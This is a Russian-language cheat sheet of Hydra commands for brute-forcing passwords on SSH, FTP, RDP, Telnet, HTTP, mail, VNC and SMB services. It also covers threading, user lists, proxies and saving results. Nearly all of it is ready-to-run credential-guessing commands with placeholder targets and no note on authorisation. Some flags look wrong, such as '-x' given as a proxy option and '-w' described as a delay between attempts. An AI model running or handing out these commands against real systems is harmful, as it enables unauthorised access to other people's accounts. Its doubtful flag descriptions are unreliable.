## Брутфорс для SSH:

```
hydra -l username -P password_list.txt ssh://IP_адрес
```

## Брутфорс для FTP:

```
hydra -l username -P password_list.txt ftp://IP_адрес
```

## Брутфорс для RDP:

```
hydra -l username -P password_list.txt rdp://IP_адрес
```

## Брутфорс для Telnet:

```
hydra -l username -P password_list.txt telnet://IP_адрес
```

## Брутфорс для HTTP Basic Authentication:

```
hydra -l username -P password_list.txt http-get://IP_адрес
```

## Брутфорс для HTTP-форм:

```
hydra -l username -P password_list.txt http-post-form "/login.php:username=^USER^&password=^PASS^:F=incorrect"
```

## Брутфорс для POP3:

```
hydra -l username -P password_list.txt pop3://IP_адрес
```

## Брутфорс для SMTP:

```
hydra -l username -P password_list.txt smtp://IP_адрес
```

## Брутфорс для IMAP:

```
hydra -l username -P password_list.txt imap://IP_адрес
```

## Указание максимального числа потоков (например, 4):

```
hydra -t 4 -l username -P password_list.txt ftp://IP_адрес
```

## Брутфорс с использованием логина из файла:

```
hydra -L user_list.txt -P password_list.txt ssh://IP_адрес
```

## Брутфорс для VNC:

```
hydra -P password_list.txt vnc://IP_адрес
```

## Брутфорс для SMB:

```
hydra -l username -P password_list.txt smb://IP_адрес
```

## Прерывание брутфорс атаки после первой удачной попытки:

```
hydra -l username -P password_list.txt -f ssh://IP_адрес
```

## Указание паузы между попытками (например, 2 секунды):

```
hydra -l username -P password_list.txt -t 4 -w 2 ssh://IP_адрес
```

## Брутфорс с использованием прокси:

```
hydra -l username -P password_list.txt -o результат.txt -s порт -t 4 -x прокси:порт ssh://IP_адрес
```

## Сохранение результатов в файл:

```
hydra -l username -P password_list.txt -o результат.txt ssh://IP_адрес
```